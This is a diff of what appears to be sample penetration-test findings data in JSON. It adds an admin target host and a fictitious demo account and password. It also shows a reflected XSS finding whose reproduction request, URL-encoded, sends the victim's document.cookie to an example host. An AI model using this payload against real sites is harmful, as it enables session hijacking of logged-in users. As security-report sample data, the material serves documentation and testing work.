@@ -28,7 +28,7 @@
       "created_at": "2026-01-01T00:00:00Z"
     }
   ],
-  "targets": ["demo.example.com"],
+  "targets": ["demo.example.com", "admin.demo.example.com"],
   "findings": [
     {
       "finding_id": 9001,
@@ -104,7 +104,7 @@
       "description": "搜索结果页将 keyword 参数未经编码直接回显到 HTML，可注入脚本窃取会话 Cookie（Cookie 未设 HttpOnly）。",
       "reproduction": {
         "entry_point": "GET https://demo.example.com/search?keyword={payload}",
-        "prerequisites": ["诱骗已登录用户点击构造链接"],
+        "prerequisites": ["诱骗已登录用户点击构造链接", "已获取低权限演示账号：demo_user / Demo#2026（虚构凭据，仅用于样例数据）"],
         "steps": [
           {
             "request": "GET /search?keyword=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fdemo.example.com%2Fx%3Ft%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\r\nHost: demo.example.com\r\nUser-Agent: artex-demo/1.0\r\nAccept: text/html\r\n\r\n",
